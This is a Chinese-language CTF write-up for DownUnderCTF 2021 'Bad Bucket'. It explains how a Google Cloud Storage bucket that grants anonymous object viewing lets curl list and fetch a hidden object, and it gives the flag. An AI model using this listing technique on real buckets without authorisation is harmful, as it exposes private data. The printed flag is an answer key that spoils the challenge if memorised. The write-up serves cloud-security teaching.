# DownUnderCTF 2021 - Bad Bucket

## 题目简述

题目给出一个托管在 Google Cloud Storage 上的静态站点。站点页面只展示几张水桶图片，但部署配置关闭了统一桶级访问，并把 `roles/storage.objectViewer` 授予 `allUsers`。因此问题不在网页本身，而在存储桶同时允许匿名读取对象和列举对象名。

关键 Terraform 配置如下：

```hcl
data "google_iam_policy" "viewer" {
  binding {
    role    = "roles/storage.objectViewer"
    members = ["allUsers"]
  }
}

resource "google_storage_bucket_iam_policy" "policy" {
  bucket      = google_storage_bucket.bucket-bucket.name
  policy_data = data.google_iam_policy.viewer.policy_data
}
```

## 解题过程

Google Cloud Storage 的公开对象 URL 形如：

```text
https://storage.googleapis.com/<bucket>/index.html
```

去掉对象路径、直接访问桶根路径，可以请求对象列表：

```bash
curl 'https://storage.googleapis.com/<bucket>'
```

服务器返回 XML 列表。除网页和四张装饰图片外，其中还有一个没有出现在 HTML 中的隐藏对象：

```xml
<Contents>
  <Key>buckets/.notaflag</Key>
  <Size>158</Size>
</Contents>
```

对象名已经通过列表接口泄露，继续按同一公开读取权限访问即可：

```bash
curl 'https://storage.googleapis.com/<bucket>/buckets/.notaflag'
```

文件正文包含：

```text
DUCTF{if_you_are_beggining_your_cloud_journey_goodluck!}
```

## 方法总结

本题的核心是云对象存储的匿名权限配置错误。看到静态站点直接使用 `storage.googleapis.com/<bucket>/...` 时，不应只检查页面引用的对象，还要测试桶级列表接口。`allUsers` 获得 `roles/storage.objectViewer` 不仅可能公开已知对象，还会让未在页面中链接的对象名一并暴露；“隐藏文件名”不能替代访问控制。
